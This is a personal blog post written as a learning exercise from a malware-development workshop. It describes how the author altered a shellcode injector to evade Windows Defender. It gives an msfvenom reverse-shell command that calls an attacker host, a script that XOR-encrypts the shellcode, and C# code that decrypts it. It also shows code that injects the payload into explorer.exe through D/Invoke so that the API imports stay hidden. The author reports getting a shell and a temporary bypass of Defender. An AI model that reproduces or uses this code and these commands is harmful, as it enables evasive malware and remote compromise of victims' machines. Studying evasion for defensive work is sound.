# Antivirus Evasion

## Introduction

Well here we are at the end of our [Malware Development for Dummies](https://github.com/chvancooten/maldev-for-dummies) journey. For our final exercise, we have to try to bypass antivirus. This was honestly the reason I wanted to get into malware development in the first place. While I was learning different red teaming techniques like Kerberoasting or pivoting, there was always a nagging feeling at the back of my mind telling me that AV would catch most of these techniques anyways. That led me down a whole rabbit hole of techniques that didn't really make any sense until I stumbled upon this workshop repo. Now, I have a much better idea about the basics of malware and antivirus evasion.

But enough about that, let's get to work! 

> **Disclaimer**: The information, techniques, and solutions detailed in this blog are for educational purposes only. Do not use this content for malicious and/or illicit purposes.

## Objective
For our final exercise, I will be modifying the solution I used for exercise 2, [the shellcode injector](https://github.com/ThreeEightSec/MalDummies-Solutions/blob/main/Exercise2.cs). If I am able to bypass Windows Defender, then I would consider that a win.

## Shellcode Obfuscation

The first thing we're going to try to do is obfuscate our shellcode payload. Our shellcode is a default `msfvenom` payload and will for sure get caught by most modern antivirus solutions.

A little while ago I was watching a Black Hills Information Security webcast with Joff Thyer where he was explaining how to use Python to execute shellcode. During that talk, he had a tool that would XOR encrypt the payload if you feed it the output of an `msfvenom` payload. It was a fantastic talk that I've linked below in the references.

The tool itself is called [xorme.py](https://github.com/RiverGumSecurity/PythonShellcode/blob/main/xorme.py). The tool is quite useful but we need to make a few changes before we can use it for our purposes.

First, the script in that repo doesn't actually work. During the talk, Joff fixed an error on line 48 of the script by changing "data.encode()" to just "data." The correct line is below:

```python
res = xorstr(data, args.k.encode())
```
Next, I changed lines 15-34 to the following:

```python
def print_bytedata(d):
    print('    byte[] buf = new byte[] {')
    line = ''
    for i, ch in enumerate(d):
        if i and not i % 16:
            print(f'    {line}')
            line = ''
        line += f'0x{ch:02x},'
    if i % 16:
        print(f'    {line}}};')
```
This will convert the `msfvenom` payload to a format that will mostly be ready for our C# solution. I'm not the best at regex so this part kind of baffled me for a bit before I moved on.

After that, the tool is good to use! We can have it encrypt our shellcode with the following command:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=attackerIP LPORT=attackerPort -f raw | python3 xorcsharp.py
```
The `msfvenom` command should look familiar by now. This will generate our shellcode and the "|" or "pipe" symbol will feed that output into our tool. The tool, which I've named "xorcsharp.py," will encrypt the shellcode with the default key: `encryptme`. To change the key, you can add the `-k` flag and supply your own. 

Remember when I said the output would be "mostly" ready? Yeah those were good times. You're going to need to edit the output a bit when you paste it into the C# solution.

First, you're going to need to enter the payload size into the empty brackets:

![XorTop](/assets/images/xorcsharp-tophalf.png)

Next, you need to delete the comma at the last line:

![XorBottom](/assets/images/xorcsharp-bottom.png)

After that, you're good. See, that wasn't so bad!

Finally, we need to decrypt the shellcode in our C# solution. To do this, I stole a piece of code from [Arno0x's EncryptedShellcodeWrapper](https://github.com/Arno0x/ShellcodeWrapper/blob/master/templates/encryptedShellcodeWrapper.cs) and put it in my own:

```c#
private static byte[] xor(byte[] cipher, byte[] key)
    {
        byte[] decrypted = new byte[cipher.Length];

        for (int i = 0; i < cipher.Length; i++)
        {
            decrypted[i] = (byte)(cipher[i] ^ key[i % key.Length]);
        }

        return decrypted;
    }
```
This function will decrypt the shellcode with a given key.

Back in our main function, we will define the key, a shellcode variable, and call the function to decrypt it:

```c#
//The key used to encrypt/decrypt the shellcode
string key = "encryptme";

// Set the shellcode variable and assign it the decrypted shellcode.
byte[] shellcode;

// Decrypt the shellcode.
shellcode = xor(encShellcode, Encoding.ASCII.GetBytes(key));
```

This code assumes that we named our encrypted shellcode `encShellcode`. With this, our shellcode is now obfuscated.

## D/Invoke

Previously, we used P/Invoke to make calls to Windows APIs. However, according to [this post by TheWover](https://thewover.github.io/Dynamic-Invoke/), API calls through P/Invoke results in an entry in the .NET Assembly's Import table. Whenever your .NET assembly is loaded, the Import Address Table, or IAT, gets updated with the addresses of the function or functions you're calling. These addresses are "static" since the application doesn't need to actively locate the function before calling it. However, we can force the application to make a "dynamic" reference so it has to manually find the address of the function. This is helpful if AV/EDR is monitoring API calls or if defenders are investigating the IAT to learn about the executable. A static reference is easier to find than if an application is dynamically referencing APIs.

To accomplish this, TheWover and their team created the [D/Invoke library](https://github.com/TheWover/DInvoke). By utilizing Delegates, D/Invoke allows us to load a DLL into memory manually, get a pointer to a function in that DLL, and then call that function from the pointer while passing in our parameters. Most of this explanation was taken from TheWover's blog so feel free to read it for more information on this.

To use D/Invoke, we first import the Nuget library into our code. We can do this in Visual Studio by going to `Tools > NuGet Package Manager > Manage NuGet Packages for Solution`.

![Nuget](/assets/images/Nuget.png)

You can then browse for and install the DInvoke library into the solution:

![DInvoke_Download](/assets/images/dinvokenuget.png)

If, for some reason, you don't have access to the Nuget package source, you can click the cog on the top right corner and enter the source URL:
![NugetSource](/assets/images/NugetSource.png)

### Converting P/Invoke to D/Invoke

With that set up, time to convert our API calls to work with D/Invoke.

[Klezvirus's post](https://klezvirus.github.io/RedTeaming/Development/From-PInvoke-To-DInvoke/) was instrumental in helping with this.

The conversion process is pretty straightforward once you get the syntax. Let's take a look at how we called our APIs using P/Invoke:

```c#
        //OpenProcess API to get handle on the target process
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(
            uint processAccess,
            bool bInheritHandle,
            int processId);

        //VirtualAllocEx to allocate memory in the remote process
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        public static extern IntPtr VirtualAllocEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect);

        //WriteProcessMemory to copy shellcode into memory
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            Int32 nSize,
            out IntPtr lpNumberofBytesWritten);

        //CreateRemoteThread to execute the shellcode in memory
        [DllImport("kernel32.dll")]
        public static extern IntPtr CreateRemoteThread(
            IntPtr hProcess,
            IntPtr lpThreadAttributes,
            uint dwStackSize,
            IntPtr lpStartAddress,
            IntPtr lpParamerter,
            uint dwCreationFlags,
            IntPtr lpThreadId);
```

Let's call our APIs using D/Invoke:

```c#
        //OpenProcess API to get handle on the target process
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate IntPtr OpenProcess(
            uint processAccess,
            bool bInheritHandle,
            int processId);

        //VirtualAllocEx to allocate memory in the remote process
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate IntPtr VirtualAllocEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect);

        //WriteProcessMemory to copy shellcode into memory
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate bool WriteProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            Int32 nSize,
            out IntPtr lpNumberofBytesWritten);

        //CreateRemoteThread to execute the shellcode in memory
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate IntPtr CreateRemoteThread(
            IntPtr hProcess,
            IntPtr lpThreadAttributes,
            uint dwStackSize,
            IntPtr lpStartAddress,
            IntPtr lpParamerter,
            uint dwCreationFlags,
            IntPtr lpThreadId);
```

Calling our APIs is pretty similar but how about using them in our main code?

Here's how the main code looked like in our P/Invoke solution:

```c#
//Get a handle on the target process
IntPtr process_handle = Methods.OpenProcess(0x1F0FFF, false, explorerProcess.Id);
IntPtr bytesWritten;

//Allocate the memory to place the shellcode
IntPtr memory_allocation = Methods.VirtualAllocEx(process_handle, IntPtr.Zero, (uint)(shellcode.Length), 0x00001000, 0x40);

//Write the shellcode into memory
Methods.WriteProcessMemory(process_handle, memory_allocation, shellcode, (int)shellcode.Length, out bytesWritten);

//Execute the code
Methods.CreateRemoteThread(process_handle, IntPtr.Zero, 0, memory_allocation, IntPtr.Zero, 0, IntPtr.Zero);
```

Here's how it looks like using D/Invoke:

```c#
//Get a handle on the target process
var pointer = Generic.GetLibraryAddress("kernel32.dll", "OpenProcess");
var openProcess = Marshal.GetDelegateForFunctionPointer(pointer, typeof(Methods.OpenProcess)) as Methods.OpenProcess;
IntPtr process_handle = openProcess(0x1F0FFF, false, explorerProcess.Id);

//Allocate the memory to place the shellcode
pointer = Generic.GetLibraryAddress("kernel32.dll", "VirtualAllocEx");
var virtualAllocEx = Marshal.GetDelegateForFunctionPointer(pointer, typeof(Methods.VirtualAllocEx)) as Methods.VirtualAllocEx;
IntPtr memory_allocation = virtualAllocEx(process_handle, IntPtr.Zero, (uint)(shellcode.Length), 0x00001000, 0x40);

//Write the shellcode into memory
IntPtr bytesWritten;
pointer = Generic.GetLibraryAddress("kernel32.dll", "WriteProcessMemory");
var writeProcessMemory = Marshal.GetDelegateForFunctionPointer(pointer, typeof(Methods.WriteProcessMemory)) as Methods.WriteProcessMemory;
writeProcessMemory(process_handle, memory_allocation, shellcode, (int)shellcode.Length, out bytesWritten);

//Execute the code
pointer = Generic.GetLibraryAddress("kernel32.dll", "CreateRemoteThread");
var createRemoteThread = Marshal.GetDelegateForFunctionPointer(pointer, typeof(Methods.CreateRemoteThread)) as Methods.CreateRemoteThread;
createRemoteThread(process_handle, IntPtr.Zero, 0, memory_allocation, IntPtr.Zero, 0, IntPtr.Zero);
```

It looks a lot more daunting but, upon closer inspection, you'll notice that our D/Invoke calls all follow a similar syntax. One thing to note is the `var pointer` variable on line 2. Once we declare the variable in that line as a variable, we can reuse that variable on lines 7, 13, and 18. I'm sure C# veterans know this already but I'm  just putting this here for my own reference.

Our code will now dynamically reference our API calls!

For reference, RastaMouse built a site similar to pinvoke.net called [dinvoke.net](https://dinvoke.net/) where we can reference D/Invoke syntax for a bunch of Windows APIs.

## Building our solution

It took me an embarassingly long time to figure this out but I figured out how to publish my code as a singular executable file so it would be easier to test.

To do this, right click the solution and click "Publish:"

![Publish](/assets/images/Publish.png)

I did this in Visual Studio 2022 and it asked me to create a publish profile. I created one with a target location on my local test machine. Once that was done, I clicked "Show all settings."

![Settings](/assets/images/AllSettings.png)

Then, we change the deployment mode to "Self-contained" and clicked Save.

![Contained](/assets/images/contained.png)

Once you click "Publish," Visual Studio should now build your code as a single executable in your specified folder!

Here is the final code for my solution:

[Exercise3.cs](https://github.com/ThreeEightSec/MalDummies-Solutions/blob/main/Exercise3.cs)

## Testing our Solution

Time to test the solution against Windows Defender! I downloaded my solution to a fully patched test Windows 10 machine.

![Updated](/assets/images/windowsupdated.png)

Here are my settings for Defender:

![Defender](/assets/images/defendersettings.png)

I have exclusions set up for several folders such as the Downloads folder.

Lets use [RastaMouse's ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) to see if Defender will flag our solution:

![Bypassed](/assets/images/defenderbypassed.png)

Holy heck looks like Defender wasn't able to find anything wrong with the file! Well...at least for a little bit.

Before I wrote this blog, I actually tested this solution out a few days ago and I was able to get a shell:

![shell!](/assets/images/bypassedshell.png)

I also uploaded it to Virustotal before writing so I could grab screenshots and let it run its analysis:

![virustotal](/assets/images/virustotal.png)

12/68 detections isn't great. But...

![undetected](/assets/images/undetectedMS.png)

At the time of writing, on 2/13/23, Virustotal still considers that my solution is undetected by Microsoft.

Here is the Virustotal link for reference:

[Virustotal](https://www.virustotal.com/gui/file/776f24b3bd085b7ba858daca139430c6a72e5754b81fd39fc5472e9d88fd7d23)

However, when I just moved my solution to the Desktop, Defender flagged it when I tried to run it. Now, when I run ThreatCheck, I get the following:

![malicious](/assets/images/maliciousFile.png)

Looks like Defender caught on to me but, hey, my solution was undetected by Microsoft for a solid several days so that's pretty cool!

## OpSec Safe?

Absolutely not. While I'm happy I was able to avoid Defender for a bit, there's plenty more to do to make this solution more stealthy. First, downloading the file causes Edge to throw a warning:

![motw](/assets/images/motw.png)

I understand this is because of something known as Mark of the Web and I'll need to dig into that more in the future. Additionally, Windows fired a warning before I could execute the file because the file had an unknown publisher. I also need to figure out how to obfuscate my actual code.

## Conclusion

This concludes my blog posts for the Malware Development for Dummies workshop. I had a lot of fun working through the workshop and I learned a lot! I can't wait to continue digging into more advanced initial access methods. Thanks for reading!
